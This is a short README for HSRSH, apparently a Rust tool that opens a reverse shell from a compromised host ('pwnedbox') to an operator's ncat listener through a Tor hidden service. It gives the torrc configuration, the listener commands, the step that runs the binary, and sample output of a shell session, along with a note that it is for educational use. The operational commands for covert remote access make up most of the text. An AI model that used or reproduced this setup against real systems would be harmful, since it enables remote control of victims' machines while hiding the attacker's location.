# HSRSH

Hidden Service Reverse Shell, aka HSRSH

This was a quickly written tool for demonstrating a reverse shell over a hidden service all in
one binary and an excuse to play with Rust. Solely for educational purposes.

1. Configure your hidden service on server you will be accepting the shell connection on. Add this to your torrc

  ```
    HiddenServiceDir /var/lib/tor/hidden_service/
    HiddenServicePort 1337 127.0.0.1:1337
  ```

2. Start listener on the hidden service. MAKE SURE TO ONLY ALLOW LOCALHOST CONNECTIONS

  ```
    user@localhost:~$ ncat --allow 127.0.0.1 -nvl 127.0.0.1 -p 1337
    Ncat: Listening on 0.0.0.0:1337
  ```

3. Execute reverse shell binary, it will create a local tor instance and connect to your listener. This takes about 15 seconds.
    ```
    user@pwnedbox:~$ ./hsrsh
    ```

4. If everything is setup properly your shell should connect after about 20 seconds or so assuming the tor and internet connection is stable.

  ```    
    user@localhost:~$ ncat --allow 127.0.0.1 -nvlp 1337
    Ncat: Version 7.60 ( https://nmap.org/ncat )
    Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
    Ncat: Listening on :::1337
    Ncat: Listening on 0.0.0.0:1337
    Ncat: Connection from 127.0.0.1.
    Ncat: Connection from 127.0.0.1:45964.
    user@pwnedbox:~$ uptime
     13:37:02 up 16 days, 46 min,  1 user,  load average: 0.82, 0.93, 1.43
  ```

To do:
    - support tls
    - windows support
    - Better / more Rust-like error handling

Things that I read that helped me out a lot with this:
- https://github.com/isdrupter/onionslicer
- https://stackoverflow.com/questions/48958814/what-is-the-rust-equivalent-of-a-reverse-shell-script-written-in-python
